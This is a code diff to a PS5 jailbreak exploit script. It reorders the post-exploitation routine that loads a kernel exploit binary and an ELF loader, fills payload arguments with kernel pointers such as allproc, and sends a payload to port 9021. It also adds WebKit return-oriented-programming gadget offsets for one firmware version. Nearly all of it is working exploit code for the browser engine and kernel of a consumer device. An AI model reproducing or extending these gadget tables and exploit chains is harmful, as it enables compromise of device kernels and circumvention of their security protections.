@@ -134,6 +134,7 @@ async function post_jailbreak() {
   // Pre-fetch ALL assets before the kernel exploit runs.
   // After the exploit, fetch() may no longer work reliably.
   const payload_u8 = await load_file('src/ps5/payload.elf');
+
   const kexp_u8 = await load_file('src/ps5/kexp.bin');
   const elfldr_u8 = await load_file('src/ps5/elfldr.elf');
 
@@ -166,6 +167,14 @@ async function post_jailbreak() {
 
   logger.debug(`payload_args: ${payload_args}`);
 
+  arw.view(payload_args).setInt32(0x00, master_pipe[0], true);
+  arw.view(payload_args).setInt32(0x04, master_pipe[1], true);
+  arw.view(payload_args).setInt32(0x08, victim_pipe[0], true);
+  arw.view(payload_args).setInt32(0x0c, victim_pipe[1], true);
+  arw.view(payload_args).setBInt(0x10, allproc, true);
+  arw.view(payload_args).setBInt(0x18, elfldr_addr, true);
+  arw.view(payload_args).setBInt(0x20, elfldr_size, true);
+
   // Build KXP2 apiTable (12 × 8 bytes = 96 bytes)
   // Index:  0=sceKernelSendNotificationRequest, 1=sysctlbyname, 2-3=unused(0),
   //         4=getpid, 5=malloc, 6=free, 7=memcpy, 8=memset, 9=strcmp, 10=memcmp, 11=vsnprintf
@@ -186,13 +195,6 @@ async function post_jailbreak() {
   arw.view(api_table).setBInt(10 * 8, lc.add(impl.lc_memcmp), true);
   arw.view(api_table).setBInt(11 * 8, lc.add(impl.lc_vsnprintf), true);
 
-  arw.view(payload_args).setInt32(0x00, master_pipe[0], true);
-  arw.view(payload_args).setInt32(0x04, master_pipe[1], true);
-  arw.view(payload_args).setInt32(0x08, victim_pipe[0], true);
-  arw.view(payload_args).setInt32(0x0c, victim_pipe[1], true);
-  arw.view(payload_args).setBInt(0x10, allproc, true);
-  arw.view(payload_args).setBInt(0x18, elfldr_addr, true);
-  arw.view(payload_args).setBInt(0x20, elfldr_size, true);
   // KXP2 extension
   arw.view(payload_args).setInt32(0x28, 0x4B585032, true); // 'KXP2' magic
   arw.view(payload_args).setInt32(0x2c, 12, true);         // api entry count
@@ -217,9 +219,6 @@ async function post_jailbreak() {
 
   logger.info(`bin returned ${ret} !!`);
 
-  // elfldr is now running — send pre-fetched payload.elf to port 9021
-  await send_payload(payload_u8);
-
   if (fn.munmap.invoke(map_addr, kexp_page_size)) {
     throw new SyscallError(`Unable to munmap ${map_addr} !!`);
   }
@@ -228,10 +227,13 @@ async function post_jailbreak() {
     throw new SyscallError(`Unable to close fd ${exec_fd} !!`);
   }
 
+  // elfldr is now running — send pre-fetched payload.elf to port 9021
+  await send_payload(payload_u8);
+
   mem.free(pthread_addr_addr);
   mem.free(payload_args);
-  mem.free(api_table);
   mem.free(ret_addr);
+  mem.free(api_table);
 }
 
 const impl_map = {
@@ -372,6 +374,36 @@ const impl_map = {
     },
     2: {
       k_route_output_rtmsg2_ret: 0xa9e780,
+
+      wk_expm1_builtin: 0x5b758,
+
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x4dea92);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x374fff);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0xa63a46);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0x18cb711);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x2f1873f);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0x3521db7);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x9a576d);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x1b5993);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0x36318b0);
+      }
     },
   },
   7: {
@@ -1375,6 +1407,7 @@ const impl_map = {
     },
     0x40: {
       lk_close: 0x1c2a0,
+
       // fw 12.40+ getpid differs; rest inherits from 12[0]
       lk_getpid: 0x1b7f0,
     },
